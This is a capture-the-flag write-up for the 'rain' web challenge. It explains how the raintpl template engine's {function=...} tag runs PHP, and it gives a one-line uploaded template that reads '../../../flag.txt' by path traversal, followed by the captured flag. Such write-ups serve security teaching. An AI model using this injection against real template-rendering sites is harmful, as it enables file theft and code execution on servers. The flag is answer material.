# rain

[library.m0unt41n.ch/challenges/rain](https://library.m0unt41n.ch/challenges/rain) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

> _What better to do on a rainy day than to look at the weather report? But having_
> _it always look the same is boring and since its raining, you have a lot of time_
> _on your hands anyway... Whats the coolest design you can up with?_

Trivial PHP injection / path traversal in the `{function="..."}` feature of
[raintpl](https://github.com/feulf/raintpl).

# Analysis

```
docker build -t rain:latest .
docker run -p 8080:80 -it rain:latest
docker container exec -it $(docker ps -ql) /bin/bash
```

The app presents a static weather view, that can be customized by uploading a custom
template which gets rendered by [raintpl](https://github.com/feulf/raintpl).

Initial look:

*   The app runs as `www-data`.
*   The app is copied to `/var/www/html`. All files owned by root, but redable.
*   Docker container does `chmod 777 tpl/`. There is also writable `tmp/` directory.
*   The flag is in (readable) `/flag.txt`.
*   `raintpl::configure("path_replace", false);` looks curious.

`rain.tpl.class.php` is taken from
[github.com/feulf/raintpl](https://github.com/feulf/raintpl)
(most recent version 2.7.2)
with *no modification*. That project has been discontinued since, as well as
[github.com/feulf/raintpl3](https://github.com/feulf/raintpl3).
No obvious vulnerabilities found in either.

While the templates are not directly executed by PHP, going through
[documentation](https://github.com/feulf/raintpl3/wiki/Documentation-for-web-designers),
the following caught my eye:

> ### _{function="function name"}_
> 
> _Use this tag to execute a PHP function and print the result. You can pass strings,_
> _numbers and variables as parameters._
> 
> ***example***: *`{function="date('%Y')"}`*<br>
> ***output***: *`2013`*

Hang on. Could it be ***that*** easy? &#128512;

Let's create a trivial "template" that prints the flag and upload / test it:

```
{function="$f = fopen('../../../flag.txt', 'r'); echo fread($f, 256);"}
```

Lo and behold:

```
Resource id #8CTE24{1t5_4_r41ny_d4y_1922c058925a} 
```

---

## `CTE24{1t5_4_r41ny_d4y_1922c058925a}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
